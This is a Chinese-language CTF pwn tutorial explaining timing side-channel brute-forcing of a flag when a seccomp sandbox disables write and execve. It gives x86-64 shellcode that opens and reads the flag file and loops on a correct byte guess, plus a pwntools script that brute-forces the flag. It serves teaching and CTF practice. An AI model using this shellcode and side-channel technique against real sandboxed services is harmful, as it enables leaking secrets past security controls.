# bypass

## 测信道爆破flag

> [!NOTE]
>
> 1、侧信道爆破需要执行我们编写的shellcode(因为程序中必然无法找到全部对应的gadget)，因此能够写入和执行一定字节的shellcode是必要的
>
> 2、程序在禁用了execve系统调用后，同时关闭了标准输出流后，才有必要使用侧信道爆破。
>
> 3、同时**标准错误不能被关闭**(因为我们需要它来反馈信息)，还必须要保证read可以从指定文件中读取flag，open或者openat系统调用要保证至少有一个可用。
>
> 攻击效果：在程序禁用了部分系统调用并且关闭了正常回显后，通过程序反馈的信息对进行flag逐位爆破。

测信道攻击在pwn中通常为一种测信道爆破的一种攻击手法，个人理解的测信道爆破是指程序没有正常回显的情况下通过执行精心构造后的数据，获得一些程序的现象或者反馈最终的flag，

### 测信道攻击的利用思路和原理

pwn题目开启沙箱后，我们通常可以采用open、read、write函数输出flag，但是如果沙箱禁用了write函数，使我们只能利用open和read函数，这时候就要利用侧信道爆破了。侧信道攻击在pwn中的主要思想就是通过逐位爆破获得flag，一般是判断猜测的字符和flag的每一位进行对比，如果相同就进入死循环，然后利用时间判断是否正确，循环超过一秒则表示当前爆破位爆破字符正确。通常侧信道攻击一般都是通过shellcode来实现的，并且比较的方法最好是使用‘二分法’这样的话节约时间并且效率高。

#### 这里我们进行一个攻击思路的一个编写：

首先我们需要想办法在程序种写入一段shellcode并且能将其执行。然后我们先执行open的系统调用，将其flag文件打开返回一个文件的描述符，然后用read系统调用来讲其读到一片可以读写的剋唇上，然后布置一段用于flag比较的shellcode这个代码的主要核心点

```asm
mov rax,rsi
mov bl,byte ptr [rax+{}]
cmp bl,{}
je $-3
```

第一行就是将flag字符串的首地址给rax(这一行并不通用，根据题目自行修改)。

第二行将flag中的某一位取出。{}是相对于flag首地址的偏移，用来确定到底是取哪一位。通俗来将第二行的{}决定了正在爆破的是flag的哪一位。

第三行则将我们给出的字符与flag中的某一位进行比较

第四行如果cmp比较时，二者不相同就不会跳转，如果相同就跳转到指令地址-3的位置

也就是说如果相同继续执行循环，如果不相同就直接崩溃掉然后重新开始

同样的你的shellcode也可以这样写

```asm
mov r12, 0x67616c66    ; 将字符串 "flag" 的 ASCII 值加载到寄存器 r12 中
push r12               ; 将 r12 的值推送到栈上
mov rdi, rsp           ; 将栈上的地址赋给寄存器 rdi
xor esi, esi           ; 将 esi 寄存器清零
xor edx, edx           ; 将 edx 寄存器清零
mov al, 2              ; 将系统调用号 2（open）加载到寄存器 al 中
syscall                ; 执行系统调用 open，打开文件名为 flag 的文件

mov rdi, rax           ; 将 open 返回的文件描述符赋给 rdi
mov rsi, 0x10700       ; 将缓冲区地址加载到 rsi（缓冲区是用于存放 flag 内容）
mov dl, 0x40           ; 将读取的字节数加载到 dl（64 字节）
xor rax, rax           ; 将 rax 寄存器清零
syscall                ; 执行系统调用 read，读取 flag 内容到缓冲区

mov dl, byte ptr [rsi+{}]  ; 将缓冲区中的某个字节加载到寄存器 dl
mov cl, {}             ; 将输入参数 char 加载到寄存器 cl
cmp cl, dl             ; 比较寄存器 cl 和 dl 的值
jz loop                ; 如果相等，跳转到 loop 标签
mov al, 60             ; 将系统调用号 60（exit）加载到寄存器 al 
syscall                ; 执行系统调用 exit

loop:
jmp loop               ; 无限循环

这个代码片段中的 {} 部分是通过 format(dis,char) 动态插入的
```



```py
def exp(dis,char):
    p.recvuntil("Welcome to silent execution-box.\n")
    shellcode = asm('''
        mov r12,0x67616c66
        push r12
        mov rdi,rsp
        xor esi,esi
        xor edx,edx
        mov al,2
        syscall
        mov rdi,rax
        mov rsi,0x10700
        mov dl,0x40
        xor rax,rax
        syscall
        mov dl, byte ptr [rsi+{}]
        mov cl, {}
        cmp cl,dl
        jz loop
        mov al,60
        syscall
        loop:
        jmp loop
        '''.format(dis,char))
    p.send(shellcode)

flag = ""

for i in range(len(flag),35):
    sleep(1)
    log.success("flag : {}".format(flag))
    for j in range(0x20,0x80):
        p = process('./pwn')
        try:
            exp(i,j)
            p.recvline(timeout=1)
            flag += chr(j)
            p.send('\n')
            log.success("{} pos : {} success".format(i,chr(j)))
            p.close()
            break
        except:           
            p.close()
```

直接使用这个脚本进行一个攻击和爆破就可以了

## 使用close绕过fd检查